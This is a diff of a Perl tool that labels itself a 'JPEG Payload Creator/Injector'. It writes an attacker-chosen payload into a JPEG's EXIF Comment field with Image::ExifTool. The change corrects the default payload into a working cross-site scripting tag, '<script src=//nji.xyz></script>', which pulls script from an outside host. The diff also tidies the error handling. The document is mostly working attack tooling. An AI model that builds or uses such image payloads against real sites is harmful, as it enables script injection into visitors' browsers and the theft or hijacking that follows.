@@ -9,11 +9,11 @@
 
 use strict;
 use warnings;
-use feature qw(say);
+use feature 'say';
 
 use Getopt::Long;
 use GD;
-use Image::ExifTool qw(:Public);
+use Image::ExifTool ':Public';
 
 sub usage;
 sub create_jpg;
@@ -28,7 +28,7 @@ GetOptions(
 usage(0)     if $help;
 usage(1) unless $outfile;
 
-$payload //= '<script src//nji.xyz></script>';
+$payload //= '<script src=//nji.xyz></script>';
 
 say <<EOF;
 [>|      JPEG Payload Creator/Injector      |<]
@@ -83,11 +83,11 @@ sub inject_payload {
 
     my  $exifTool   = Image::ExifTool->new;
 
-    my ($ok, $fail) = $exifTool->SetNewValue('Comment', $payload);
+    $exifTool->SetNewValue('Comment', $payload)
+        or die "[✘] Fail to SetNewValue\n";
 
-    die "[✘] Fail to SetNewValue\n" if $fail;
-
-    $exifTool->WriteInfo($outfile) || die "[✘] Fail to WriteInfo\n";
+    $exifTool->WriteInfo($outfile)
+        or die "[✘] Fail to WriteInfo\n";
     
     say "[✔] Payload was injected successfully\n";
 }
